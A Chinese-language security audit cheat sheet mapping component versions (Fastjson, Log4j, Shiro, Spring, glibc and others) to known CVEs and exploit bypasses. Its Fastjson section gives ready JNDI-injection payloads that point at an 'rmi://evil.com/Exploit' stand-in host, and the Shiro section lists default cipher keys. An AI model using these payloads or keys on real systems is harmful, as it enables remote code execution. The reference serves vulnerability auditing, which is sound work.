# 版本边界速查表 (Version Boundaries Reference)

> 关键组件的安全版本边界汇总，用于快速判断利用可行性
> 核心原则：同一漏洞点在不同版本需要不同利用方法

---

## 版本敏感审计原则

```
⚠️ 版本边界敏感思维

1. 确认版本：审计前必须确认目标组件的精确版本号
2. 查阅边界：根据版本判断可用的利用技术
3. 调整策略：高版本可能需要不同的绕过方法
4. 记录差异：报告中标注版本相关的利用条件

常见错误：
✗ 假设所有版本的利用方式相同
✗ 忽略补丁版本号的影响
✗ 使用过时的PoC而不验证版本兼容性
```

---

## Java 生态版本边界

### JDK JNDI 注入限制

| 限制类型 | 生效版本 | 影响 | 绕过方法 |
|----------|----------|------|----------|
| RMI远程加载 | 6u132, 7u122, 8u113 | 默认禁止RMI远程类加载 | 使用LDAP或本地Gadget |
| LDAP远程加载 | 6u211, 7u201, 8u191, 11.0.1 | 默认禁止LDAP远程类加载 | 本地Gadget链、序列化数据 |

**高版本绕过思路**：
```
8u191+ 绕过路径:
1. 本地 Gadget 链 (BeanFactory + ELProcessor)
2. LDAP 返回序列化数据 (javaSerializedData)
3. RMI 本地工厂类利用
4. 利用 Tomcat 的 BeanFactory

检测命令:
java -version 2>&1 | grep version
```

### Fastjson 版本边界

| 版本范围 | 安全状态 | 关键变化 |
|----------|----------|----------|
| < 1.2.25 | 高危 | 无 autoType 检查，直接 RCE |
| 1.2.25 - 1.2.41 | 中危 | 开启 autoType 检查，但有绕过 |
| 1.2.42 - 1.2.47 | 中危 | 修复部分绕过，仍有 cache 绕过 |
| 1.2.48 - 1.2.67 | 低危 | 修复 cache 绕过，expectClass 绕过 |
| 1.2.68 - 1.2.80 | 低危 | AutoCloseable 绕过 |
| 1.2.83+ | 相对安全 | safeMode 默认开启 |
| 2.x | 安全 | 完全重写，默认安全 |

**版本检测**：
```bash
# Maven 项目
grep -rn "fastjson" pom.xml | grep version

# Gradle 项目
grep -rn "fastjson" build.gradle
```

**各版本绕过 Payload 速查**：
```
1.2.25-1.2.41: L开头绕过
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://evil.com/Exploit"}

1.2.42: LL双写绕过
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://evil.com/Exploit"}

1.2.43-1.2.47: 利用缓存机制
需要两次请求，第一次缓存类

1.2.68+: AutoCloseable 绕过
需要特定依赖链
```

### Log4j 版本边界

| 版本范围 | CVE | 状态 | 说明 |
|----------|-----|------|------|
| < 2.0-beta9 | - | 安全 | 不受 Log4Shell 影响 |
| 2.0-beta9 - 2.14.1 | CVE-2021-44228 | 高危 | Log4Shell RCE |
| 2.15.0 | CVE-2021-45046 | 中危 | 部分修复，仍可DoS/RCE |
| 2.16.0 | CVE-2021-45105 | 低危 | DoS漏洞 |
| 2.17.0+ | - | 安全 | 完全修复 |
| 1.x | CVE-2021-4104 | 中危 | JMSAppender 可被利用 |

**检测命令**：
```bash
# 查找 Log4j 版本
find . -name "log4j*.jar" 2>/dev/null
grep -rn "log4j" pom.xml build.gradle
```

### Jackson 版本边界

| 版本范围 | 安全状态 | 说明 |
|----------|----------|------|
| < 2.9.10.8 | 高危 | 多个 Gadget 链可用 |
| 2.9.10.8 - 2.12.x | 中危 | 黑名单持续更新，仍有绕过 |
| 2.13.0+ | 相对安全 | 默认禁用多态类型 |

**危险配置检测**：
```java
// 危险配置
objectMapper.enableDefaultTyping()
objectMapper.activateDefaultTyping()
@JsonTypeInfo(use = Id.CLASS)
```

### Spring 版本边界

| 漏洞 | 影响版本 | 修复版本 |
|------|----------|----------|
| Spring4Shell (CVE-2022-22965) | 5.3.0-5.3.17, 5.2.0-5.2.19 | 5.3.18+, 5.2.20+ |
| SpEL注入 (CVE-2022-22950) | 5.3.0-5.3.16 | 5.3.17+ |
| Spring Cloud Function SpEL | 3.1.6, 3.2.2 以下 | 3.1.7+, 3.2.3+ |

**Spring4Shell 利用条件**：
```
1. JDK 9+ (使用 module 机制)
2. Spring MVC / WebFlux
3. 打包为 WAR 部署在 Tomcat
4. 存在参数绑定的 POJO
```

### Shiro 版本边界

| 版本范围 | 漏洞 | 说明 |
|----------|------|------|
| < 1.2.5 | CVE-2016-4437 | 硬编码密钥，可直接利用 |
| 1.2.5 - 1.4.1 | CVE-2019-12422 | Padding Oracle 攻击 |
| < 1.5.3 | CVE-2020-1957 | 路径绕过 |
| < 1.7.1 | CVE-2020-17523 | 路径绕过 |
| 1.10.0+ | - | 相对安全 |

**密钥检测**：
```bash
# 常见默认密钥
kPH+bIxk5D2deZiIxcaaaA==
2AvVhdsgUs0FSA3SDFAdag==
4AvVhmFLUs0KTA3Kprsdag==
```

---

## Python 生态版本边界

### Pickle 反序列化

| Python版本 | 安全性 | 说明 |
|------------|--------|------|
| 所有版本 | 高危 | pickle 永远不安全，无版本差异 |

**注意**：
```python
# 以下都是危险的
pickle.load(user_input)
pickle.loads(user_input)
cPickle.load(user_input)

# 安全替代
json.loads()  # 仅限简单数据
```

### PyYAML 版本边界

| 版本范围 | 安全状态 | 说明 |
|----------|----------|------|
| < 5.1 | 高危 | yaml.load() 默认不安全 |
| 5.1 - 5.3 | 中危 | 需要显式指定 Loader |
| 5.4+ | 相对安全 | yaml.load() 需要 Loader，警告更严格 |

**危险用法检测**：
```python
# 危险
yaml.load(data)
yaml.load(data, Loader=yaml.Loader)
yaml.load(data, Loader=yaml.UnsafeLoader)

# 安全
yaml.safe_load(data)
yaml.load(data, Loader=yaml.SafeLoader)
```

### Django 版本边界

| 漏洞 | 影响版本 | 修复版本 |
|------|----------|----------|
| SQL注入 (CVE-2022-28346) | 3.2.x < 3.2.13, 4.0.x < 4.0.4 | 3.2.13+, 4.0.4+ |
| 路径遍历 (CVE-2021-45115) | 2.2.x < 2.2.26, 3.2.x < 3.2.11 | 2.2.26+, 3.2.11+ |

---

## JavaScript/Node.js 生态版本边界

### Lodash 原型污染

| 版本范围 | CVE | 说明 |
|----------|-----|------|
| < 4.17.5 | CVE-2018-3721 | defaultsDeep 原型污染 |
| < 4.17.11 | CVE-2018-16487 | merge/mergeWith 原型污染 |
| < 4.17.12 | CVE-2019-1010266 | 多个函数原型污染 |
| 4.17.21+ | - | 相对安全 |

### Express 版本边界

| 版本范围 | 安全状态 | 说明 |
|----------|----------|------|
| < 4.18.2 | 中危 | 多个安全问题 |
| 4.18.2+ | 相对安全 | 持续更新 |

### jQuery 版本边界

| 版本范围 | CVE | 说明 |
|----------|-----|------|
| < 1.9.0 | CVE-2012-6708 | XSS |
| < 3.0.0 | CVE-2015-9251 | XSS |
| < 3.5.0 | CVE-2020-11022 | XSS |
| 3.5.0+ | - | 相对安全 |

---

## PHP 生态版本边界

### PHP 版本边界

| 版本范围 | 安全状态 | 关键变化 |
|----------|----------|----------|
| < 5.3.4 | 高危 | 空字节截断可用 |
| < 7.0 | 中危 | 多个已知漏洞 |
| 7.0 - 7.4 | 低危 | 持续更新中 |
| 8.0+ | 相对安全 | 新安全特性 |

### Laravel 版本边界

| 版本范围 | 漏洞 | 说明 |
|----------|------|------|
| < 8.4.2 | CVE-2021-3129 | Debug RCE (Ignition) |
| < 6.18.35, < 7.22.4, < 8.22.1 | CVE-2021-21263 | 反序列化 RCE |

### ThinkPHP 版本边界

| 版本范围 | 漏洞 | 说明 |
|----------|------|------|
| 5.0.x < 5.0.24 | CVE-2018-20062 | RCE |
| 5.1.x < 5.1.31 | CVE-2018-20062 | RCE |
| 6.0.x < 6.0.7 | - | 反序列化 |

---

## Go 生态版本边界

### Go 标准库

| 版本范围 | 漏洞 | 说明 |
|----------|------|------|
| < 1.17.12 | CVE-2022-32189 | math/big 拒绝服务 |
| < 1.18.4 | CVE-2022-32189 | math/big 拒绝服务 |
| < 1.19.1 | CVE-2022-27664 | net/http 拒绝服务 |

### Gin 框架

| 版本范围 | 安全状态 | 说明 |
|----------|----------|------|
| < 1.7.0 | 中危 | 路径遍历风险 |
| 1.7.0+ | 相对安全 | 持续更新 |

---

## 中间件/服务器版本边界

### Tomcat 版本边界

| 漏洞 | 影响版本 | 说明 |
|------|----------|------|
| CVE-2020-1938 (Ghostcat) | < 7.0.100, < 8.5.51, < 9.0.31 | AJP 文件读取/包含 |
| CVE-2019-0232 | Windows, CGI enabled | 命令执行 |
| CVE-2017-12615 | 7.0.0-7.0.81 (Windows, PUT enabled) | 任意文件写入 |

### Nginx 版本边界

| 漏洞 | 影响版本 | 说明 |
|------|----------|------|
| CVE-2021-23017 | < 1.21.0 | DNS解析漏洞 |
| 路径穿越配置错误 | 所有版本 | alias配置不当 |

### Redis 版本边界

| 版本范围 | 安全状态 | 说明 |
|----------|----------|------|
| < 6.0 | 高危 | 默认无认证 |
| 6.0+ | 中危 | ACL系统，但仍需正确配置 |
| 7.0+ | 相对安全 | 增强的安全特性 |

### Elasticsearch 版本边界

| 版本范围 | 安全状态 | 说明 |
|----------|----------|------|
| < 7.0 | 高危 | 默认无认证 |
| 7.0+ | 中危 | 需要配置安全特性 |
| 8.0+ | 相对安全 | 默认开启安全特性 |

---

## 二进制/系统级版本边界

### glibc 版本边界

| 版本 | 关键变化 | 对利用的影响 |
|------|----------|--------------|
| 2.23 | 引入 tcache | 新的利用原语 |
| 2.27 | tcache 双重释放检查 | 需要绕过 |
| 2.29 | tcache key 机制 | double free 更难 |
| 2.32 | safe-linking | 指针加密，需要泄露 |
| 2.34 | 移除 __malloc_hook | 传统利用方式失效 |

### Kernel 版本边界

| 功能 | 版本 | 影响 |
|------|------|------|
| SMEP | 3.0+ | 不能在用户空间执行内核代码 |
| SMAP | 3.7+ | 不能在内核态访问用户空间内存 |
| KASLR | 3.14+ | 内核地址随机化 |
| KPTI | 4.15+ | Meltdown 缓解 |

---

## 版本检测命令速查

```bash
# Java
java -version
mvn dependency:tree | grep -E "fastjson|jackson|log4j|shiro"

# Python
python --version
pip list | grep -E "PyYAML|Django|Flask"

# Node.js
node --version
npm list | grep -E "lodash|express|jquery"

# PHP
php --version
composer show | grep -E "laravel|symfony"

# Go
go version
go list -m all | grep -E "gin|echo"

# 系统
ldd --version  # glibc
uname -r       # kernel
```

---

## 使用指南

### 审计流程中的应用

```
1. 识别技术栈和组件版本
2. 查阅本表确定版本安全状态
3. 根据版本选择合适的利用技术
4. 在报告中标注版本相关的利用条件
```

### 报告格式

```markdown
## 漏洞: [漏洞名称]

### 版本信息
- 组件: Fastjson
- 当前版本: 1.2.47
- 安全状态: 中危 (存在 cache 绕过)

### 利用条件
- 需要两次请求利用 cache 机制
- 依赖项中需要存在可用的 Gadget 类

### 版本特定 PoC
[针对该版本的 PoC]

### 修复建议
升级到 1.2.83+ 或 2.x 版本
```

---

**版本**: 1.0
**来源**: 先知社区安全研究 + 公开CVE信息汇总
**更新日期**: 2026-02-02
